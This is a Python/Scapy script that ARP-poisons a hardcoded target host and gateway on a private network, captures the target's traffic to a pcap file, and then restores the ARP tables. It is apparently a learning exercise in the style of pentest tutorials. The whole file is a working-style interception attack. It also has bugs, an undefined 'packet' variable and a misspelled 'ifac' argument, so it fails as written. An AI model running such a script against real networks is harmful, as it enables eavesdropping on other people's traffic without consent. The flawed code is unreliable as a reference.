from scapy.all import *
import os
import sys
import threading
import signal
from arper_def import restore_target, get_mac, poison_target

interface = 'en1'
target_ip = '192.168.43.252'
gateway_ip = '192.168.43.196'


packet_count = 1000

conf.iface = interface

conf.verb = 0

print('setting up %s' % interface)

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print('!!! fail to get gateway MAC. exiting')
    sys.exit(0)
else:
    print('gateway %s is at %s' % (gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print('!!! fail ti get target MAC. exiting')
    sys.exit()
else:
    print("target %s is at %s" % (target_ip, target_mac))

poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print('starting sniffer for %d packets' % packet_count)

    bpf_filter = 'ip host ' + target_ip
    packets = sniff(count=packet, filter=bpf_filter, ifac='any')

    wrpcap('arper.pcap', packets)

    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
